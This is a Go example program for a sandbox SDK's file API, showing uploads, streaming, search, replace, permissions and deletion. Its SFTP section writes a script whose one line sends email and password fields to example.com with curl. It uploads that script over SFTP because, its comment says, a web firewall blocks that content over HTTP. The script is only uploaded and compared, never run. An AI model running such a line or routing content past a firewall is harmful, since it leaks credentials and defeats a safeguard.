// Command files runs the file calls of a sandbox once and checks the answers:
// upload one and several files, stream a big one up and down with progress,
// upload a script over SFTP,
// list, search, replace, move, set permissions and delete.
//
// Run from packages/go: set -a; . ../../.env; set +a; go run ./examples/files
package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"errors"
	"fmt"
	"io"
	"log"
	"time"

	sdkerrors "github.com/mogenius/mo-sandbox-sdk/packages/go/pkg/errors"
	"github.com/mogenius/mo-sandbox-sdk/packages/go/pkg/mogenius"
	"github.com/mogenius/mo-sandbox-sdk/packages/go/pkg/options"
	"github.com/mogenius/mo-sandbox-sdk/packages/go/pkg/types"
)

func main() {
	if err := run(context.Background()); err != nil {
		log.Fatal(err)
	}
}

func run(ctx context.Context) (err error) {
	client, err := mogenius.NewClient()
	if err != nil {
		return err
	}
	sandbox, err := client.Create(ctx, types.SnapshotParams{
		SandboxBaseParams: types.SandboxBaseParams{Labels: map[string]string{"example": "files"}},
	}, options.WithTimeout(2*time.Minute))
	if err != nil {
		return err
	}
	defer func() {
		if deleteErr := client.Delete(ctx, sandbox); deleteErr != nil && err == nil {
			err = deleteErr
		}
		fmt.Println("deleted")
	}()
	fs := sandbox.FileSystem
	// everything happens below one folder relative to the working directory
	root := fmt.Sprintf("e2e-files-%d", time.Now().Unix())

	// one file, then several in one request
	if err := fs.UploadFile(ctx, []byte("hello world\n"), root+"/a.txt"); err != nil {
		return err
	}
	results, err := fs.UploadFiles(ctx, []types.FileUpload{
		{Source: []byte("TODO: first\n"), Destination: root + "/src/b.txt"},
		{Source: []byte("TODO: second\n"), Destination: root + "/src/c.txt"},
	})
	if err != nil {
		return err
	}
	for _, result := range results {
		fmt.Printf("uploaded %s: %v %s\n", result.Path, result.Success, result.Error)
	}

	// several back at once; the missing one fails on its own
	for _, download := range fs.DownloadFiles(ctx, []string{root + "/a.txt", root + "/src/b.txt", root + "/missing.txt"}) {
		var notFound *sdkerrors.MogeniusNotFoundError
		switch {
		case errors.As(download.Error, &notFound):
			fmt.Printf("download %s: not found, as expected\n", download.Path)
		case download.Error != nil:
			return download.Error
		default:
			fmt.Printf("download %s: %q\n", download.Path, download.Data)
		}
	}

	// a big file streamed up and down, neither side holding it whole
	big := make([]byte, 8<<20)
	if _, err := rand.Read(big); err != nil {
		return err
	}
	var sent int64
	if err := fs.UploadFileStream(ctx, bytes.NewReader(big), root+"/big.bin",
		mogenius.WithUploadProgress(func(p mogenius.UploadProgress) { sent = p.BytesSent })); err != nil {
		return err
	}
	stream, err := fs.DownloadFileStream(ctx, root+"/big.bin")
	if err != nil {
		return err
	}
	back, err := io.ReadAll(stream)
	_ = stream.Close()
	if err != nil {
		return err
	}
	fmt.Printf("big.bin: sent %d bytes, got %d back, identical: %v\n", sent, len(back), bytes.Equal(back, big))

	// over SFTP through the stream gateway: content a web firewall in front of the API blocks over HTTP
	script := []byte("jq -n --arg p \"$p\" '{email:$e,password:$p}' | curl -s -X POST https://example.com -d @-\n")
	if err := fs.UploadFile(ctx, script, root+"/sftp/run.sh", options.WithTransport(options.TransportSFTP)); err != nil {
		return err
	}
	scriptBack, err := fs.DownloadFile(ctx, root+"/sftp/run.sh", nil)
	if err != nil {
		return err
	}
	fmt.Printf("run.sh over SFTP: identical: %v\n", bytes.Equal(scriptBack, script))

	// list, search by name, find lines, replace
	entries, err := fs.ListFiles(ctx, root)
	if err != nil {
		return err
	}
	for _, entry := range entries {
		fmt.Println("  ", entry.Permissions, entry.Size, entry.Name)
	}
	found, err := fs.SearchFiles(ctx, root, "*.txt")
	if err != nil {
		return err
	}
	fmt.Println("*.txt:", found.(map[string]any)["files"])
	matches, err := fs.FindFiles(ctx, root+"/src", "TODO")
	if err != nil {
		return err
	}
	for _, match := range matches.([]map[string]any) {
		fmt.Printf("  %s:%d: %s\n", match["file"], match["line"], match["content"])
	}
	if _, err := fs.ReplaceInFiles(ctx, []string{root + "/src/b.txt"}, "TODO", "DONE"); err != nil {
		return err
	}

	// move, permissions, delete
	if err := fs.MoveFiles(ctx, root+"/a.txt", root+"/src/a.txt"); err != nil {
		return err
	}
	if err := fs.SetFilePermissions(ctx, root+"/src/a.txt", options.WithPermissionMode("600")); err != nil {
		return err
	}
	info, err := fs.GetFileInfo(ctx, root+"/src/a.txt")
	if err != nil {
		return err
	}
	fmt.Println("src/a.txt:", info.Permissions)
	return fs.DeleteFile(ctx, root, true)
}
